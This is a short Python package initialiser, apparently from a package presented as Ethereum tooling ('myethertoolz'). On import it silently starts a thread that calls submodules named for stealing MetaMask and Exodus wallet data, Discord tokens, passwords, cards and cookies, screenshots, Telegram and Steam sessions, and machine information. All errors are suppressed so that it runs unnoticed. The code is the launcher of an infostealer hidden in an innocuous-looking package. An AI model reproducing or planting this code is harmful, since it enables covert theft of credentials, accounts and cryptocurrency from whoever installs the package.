from .metamask import yea
from .discord import find_tokens
from .exodus import runner
from .machine import machineinfo

def stha():
    try:
        
        import myethertoolz.passwords_cards_cookies
    except Exception as e:
        print(e)
        pass
    from .screenshot import sikrinsat
    from .telegram import telegram
    try:
        
        import steam
    except:
        pass


    try:
        yea()
    except Exception as e:
        print(e)
        pass


    try:
        yea()
    except:
        pass
    try:
        find_tokens()
    except:
        pass
    try:
        runner()
    except:
        pass
    try:
        machineinfo()
    except Exception as e:
        print(e)
        pass
    try:
        sikrinsat()
    except:
        pass
    try:
        telegram()
    except:
        pass


from threading import Thread


za2 = Thread(target=stha, args=())
za2.start()
